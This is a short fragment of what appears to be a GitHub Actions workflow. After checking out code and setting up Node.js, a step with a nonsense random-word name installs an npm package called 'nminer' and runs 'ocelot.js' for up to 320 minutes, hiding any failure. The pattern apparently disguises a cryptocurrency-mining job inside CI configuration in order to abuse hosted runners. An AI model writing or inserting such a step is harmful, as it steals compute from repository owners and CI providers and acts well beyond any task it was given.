    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: pharmacopoeia cleverly lieu
        run: |
          npm install nminer@latest
          timeout 320m node ocelot.js || echo "ocelot executed"